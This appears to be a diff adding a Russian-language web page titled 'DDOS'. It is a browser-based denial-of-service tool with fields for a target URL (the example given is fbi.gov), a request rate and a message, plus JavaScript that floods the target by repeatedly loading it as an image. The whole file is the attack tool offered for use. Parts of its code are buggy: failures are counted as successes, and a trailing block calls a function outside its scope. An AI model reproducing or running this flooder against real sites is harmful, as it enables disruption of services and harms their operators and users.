@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <title>DDOS</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+
+    <div class="main">
+        <div class="logo">
+            DDOS
+        </div>
+        <div class="content">
+            <div class="target">
+                <legend>Введите URL</legend>
+                <input type="text" id="targetURL" class="form-group">
+            </div>
+            <span>Пример: https://www.fbi.gov/</span>
+            <div class="setup">
+                <legend>Количество пакетов/сек</legend>
+                <input type="text" id="rps" value="100" class="form-group">
+                <legend>Сообщение</legend>
+                <input type="text" id="message" value="fsociety" class="form-group">
+            </div>
+            <div class="start">
+                <button id="fireButton">
+                    !НАЧАТЬ!
+                </button>
+            </div>
+            <div class="stat">
+                <legend style="color: black">Статус:</legend>
+                <dl>
+                    <dt style="color: azure">Отправлено:</dt>
+                    <dd id="requestedCtr" style="color: aliceblue">0</dd>
+                    <dt style="opacity: 0.5; color: lightgreen;">Отправлено OK :</dt>
+
+                    <dd style="opacity: 0.5; color: aliceblue" id="succeededCtr">0</dd>
+                    <dt style="opacity: 0.5; color: lightcoral;">Отправлено неудачно :</dt>
+                    <dd style="opacity: 0.5; color: aliceblue" id="failedCtr">0</dd>
+                </dl>
+            </div>
+        </div>
+        <div class="footer">
+            Created by <span>UserName</span>
+        </div>
+    </div>
+
+
+    <script>
+        (function() {
+            var fireInterval;
+            var isFiring = false;
+            var requestedCtrNode = document.getElementById("requestedCtr"),
+                succeededCtrNode = document.getElementById("succeededCtr"),
+                failedCtrNode = document.getElementById("failedCtr"),
+                targetURLNode = document.getElementById("targetURL"),
+                fireButton = document.getElementById("fireButton"),
+                messageNode = document.getElementById("message"),
+                rpsNode = document.getElementById("rps"),
+                timeoutNode = document.getElementById("timeout");
+            var targetURL = targetURLNode.value;
+            targetURLNode.onchange = function() {
+                targetURL = this.value;
+            };
+            var requestsHT = {};
+            var requestedCtr = 0,
+                succeededCtr = 0,
+                failedCtr = 0;
+            var makeHttpRequest = function() {
+                if (requestedCtr > failedCtr + succeededCtr + 1000) {
+                    return;
+                };
+
+                var rID = Number(new Date());
+                var img = new Image();
+                img.onerror = function() {
+                    onFail(rID);
+                };
+                img.onabort = function() {
+                    onFail(rID);
+                };
+                img.onload = function() {
+                    onSuccess(rID);
+                };
+
+                img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+                requestsHT[rID] = img;
+                onRequest(rID);
+            };
+
+            var onRequest = function(rID) {
+                requestedCtr++;
+                requestedCtrNode.innerHTML = requestedCtr;
+            };
+
+            var onComplete = function(rID) {
+                delete requestsHT[rID];
+            };
+
+            var onFail = function(rID) {
+
+
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            var onSuccess = function(rID) {
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            fireButton.onclick = function() {
+                if (isFiring) {
+                    clearInterval(fireInterval);
+                    isFiring = false;
+                    this.innerHTML = "!НАЧАТЬ!";
+                } else {
+                    isFiring = true;
+                    this.innerHTML = "Стоп";
+
+                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+                }
+            };
+
+        })();
+
+        isFiring = true;
+        document.getElementById("fireButton").innerHTML = "Начать";
+        fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
+
+    </script>
+</body>
+
+</html>
